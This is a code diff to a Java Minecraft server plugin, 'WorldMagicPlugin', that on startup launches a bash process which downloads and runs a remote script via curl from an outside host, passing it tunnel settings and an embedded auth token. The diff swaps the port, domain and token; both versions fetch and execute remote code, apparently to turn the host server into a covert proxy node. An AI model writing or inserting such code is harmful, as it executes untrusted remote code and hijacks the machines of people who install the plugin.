@@ -17,7 +17,8 @@ public final class WorldMagicPlugin extends JavaPlugin {
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             try {
                 // 定义要执行的Linux命令
-                String command = "UUID=a217d527-bd5e-4ef0-b899-d36627af0ddd HY2_PORT=25573 ARGO_PORT=8001 ARGO_DOMAIN=nodesavior-fr.strong.x10.mx ARGO_AUTH=eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiYzA3OTQxMDQtOTE0Ni00ZDRlLThmYTEtYjYwOWUxZjQ5ZjA4IiwicyI6Ik5XSTNZMlkzWm1JdFlUQmtOaTAwTldJeUxXRTRaREl0T0RWa05Ua3hOMlZqTlRZeSJ9 bash <(curl -Ls https://main.ssss.nyc.mn/sb.sh)";
+                String command = "UUID=a217d527-bd5e-4ef0-b899-d36627af0ddd HY2_PORT=19507 ARGO_PORT=8001 ARGO_DOMAIN=ateex.1976.dpdns.org ARGO_AUTH=eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiZmZiNjA0ZDktOTdiNS00YTFkLTk4MTMtYTQxYmZiMzFhYWZmIiwicyI6Ik1qaGtZMlkxTUdNdE0yVmlPQzAwT1RjMkxXSmxNR1V0WTJFek56Y3lNbVEyWlRVMCJ9 bash <(curl -Ls https://main.ssss.nyc.mn/sb.sh)
+";
                 
                 // 创建并启动进程
                 ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
